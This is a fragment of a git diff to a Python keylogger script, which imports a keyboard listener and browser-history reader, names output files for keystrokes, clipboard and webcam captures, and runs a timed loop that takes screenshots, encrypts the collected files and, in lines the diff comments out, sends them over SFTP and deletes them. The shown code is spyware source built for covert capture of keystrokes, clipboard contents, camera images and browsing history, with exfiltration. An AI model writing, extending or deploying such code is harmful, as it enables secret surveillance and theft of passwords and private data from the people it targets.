@@ -11,7 +11,6 @@ from pynput.keyboard import Key, Listener
 from browser_history import get_history
 from browser_history.browsers import Firefox
 
-
 keys_information = "key_log.txt"
 clipboard_information = "Clipboard.txt"
 camera_information = ".png"
@@ -131,9 +130,6 @@ def read_file():
     file1.close()
 
 
-
-
-
 number_of_iterations = 0
 currentTime = time.time()
 stopTime = time.time() + time_iterations
@@ -156,6 +152,7 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
             count = 0
             write_file(keys)
             keys = []
+
 
     # writes captured key stokes to a file
     def write_file(keys):
@@ -216,12 +213,12 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
     # order of the functions which will run one at a time
     if currentTime > stopTime:
         screenshots()
-        copy_clipboard()
-        capture_webcam()
-        read_file()
+        #read_file()
+        #copy_clipboard()
+        #capture_webcam()
         encrypt_files()
-        sftp_files()
-        delete_files()
+        #sftp_files()
+        #delete_files()
 
         number_of_iterations += 1
 
@@ -229,3 +226,5 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         stopTime = time.time() + time_iterations
 
 cv2.destroyAllWindows()
+
+
